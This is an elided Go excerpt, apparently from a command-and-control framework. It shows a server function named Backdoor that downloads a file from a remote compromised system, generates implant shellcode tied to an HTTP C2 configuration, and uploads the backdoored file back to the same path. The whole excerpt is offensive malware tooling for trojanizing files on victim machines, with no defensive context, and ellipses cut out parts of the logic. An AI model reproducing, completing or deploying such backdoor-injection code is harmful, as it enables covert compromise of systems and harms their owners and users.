...
// Backdoor - Inject a phantom payload in a file on the remote system
func (rpc *Server) Backdoor(ctx context.Context, req *clientpb.BackdoorReq) (*clientpb.Backdoor, error) {
	...
	download, err := rpc.Download(context.Background(), &phantompb.DownloadReq{
	...
	fPath, err := generate.PhantomShellcode(name, build, p.Config, httpC2Config.ImplantConfig)
	if err != nil {
		return nil, rpcError(err)
	}
	...
	upload, err := rpc.Upload(context.Background(), &phantompb.UploadReq{
		Encoder: "gzip",
		Data:    uploadGzip,
		Path:    req.FilePath,
		Request: &commonpb.Request{
